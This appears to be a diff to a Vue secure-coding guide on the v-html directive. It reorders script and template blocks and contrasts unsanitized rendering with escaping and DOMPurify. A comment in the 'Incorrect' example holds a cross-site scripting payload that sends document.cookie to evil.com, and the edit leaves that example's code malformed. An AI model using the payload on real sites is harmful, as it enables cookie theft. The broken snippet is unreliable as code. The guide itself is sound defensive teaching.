@@ -22,41 +22,31 @@ The `v-html` directive renders raw HTML without sanitization. While useful for t
 
 **Incorrect:**
 ```vue
-<template>
-  <!-- DANGEROUS: User input rendered as HTML -->
-  <div v-html="userComment"></div>
-
-  <!-- DANGEROUS: Content from API without sanitization -->
-  <article v-html="articleContent"></article>
-
-  <!-- DANGEROUS: URL parameters or form inputs -->
-  <p v-html="searchQuery"></p>
-</template>
-
 <script setup>
 import { ref } from 'vue'
 
-// This could contain: <script>document.location='https://evil.com/steal?cookie='+document.cookie</script>
+// This could contain: <script>document.location='https://evil.com/steal?cookie='+document.cookie
+</script>
+
+<template>
+  <!-- DANGEROUS: User input rendered as HTML -->
+  <div v-html="userComment" />
+
+  <!-- DANGEROUS: Content from API without sanitization -->
+  <article v-html="articleContent" />
+
+  <!-- DANGEROUS: URL parameters or form inputs -->
+  <p v-html="searchQuery" />
+</template>
 const userComment = ref(props.comment)
 </script>
 ```
 
 **Correct:**
 ```vue
-<template>
-  <!-- SAFE: Text interpolation escapes HTML -->
-  <div>{{ userComment }}</div>
-
-  <!-- SAFE: Use components for rich content -->
-  <CommentRenderer :content="userComment" />
-
-  <!-- SAFE: Only use v-html with trusted, sanitized content -->
-  <div v-html="sanitizedContent"></div>
-</template>
-
 <script setup>
-import { computed } from 'vue'
 import DOMPurify from 'dompurify'
+import { computed } from 'vue'
 
 const props = defineProps(['comment', 'trustedHtml'])
 
@@ -68,19 +58,22 @@ const sanitizedContent = computed(() =>
   DOMPurify.sanitize(props.trustedHtml)
 )
 </script>
+
+<template>
+  <!-- SAFE: Text interpolation escapes HTML -->
+  <div>{{ userComment }}</div>
+
+  <!-- SAFE: Use components for rich content -->
+  <CommentRenderer :content="userComment" />
+
+  <!-- SAFE: Only use v-html with trusted, sanitized content -->
+  <div v-html="sanitizedContent" />
+</template>
 ```
 
 ## When v-html Is Acceptable
 
 ```vue
-<template>
-  <!-- OK: Static HTML from your own codebase -->
-  <div v-html="staticLegalDisclaimer"></div>
-
-  <!-- OK: Content from trusted CMS with sanitization -->
-  <article v-html="sanitizedCmsContent"></article>
-</template>
-
 <script setup>
 // Content you control, not user input
 const staticLegalDisclaimer = `
@@ -88,6 +81,14 @@ const staticLegalDisclaimer = `
   <a href="/legal">Read more</a>
 `
 </script>
+
+<template>
+  <!-- OK: Static HTML from your own codebase -->
+  <div v-html="staticLegalDisclaimer" />
+
+  <!-- OK: Content from trusted CMS with sanitization -->
+  <article v-html="sanitizedCmsContent" />
+</template>
 ```
 
 ## XSS Attack Examples
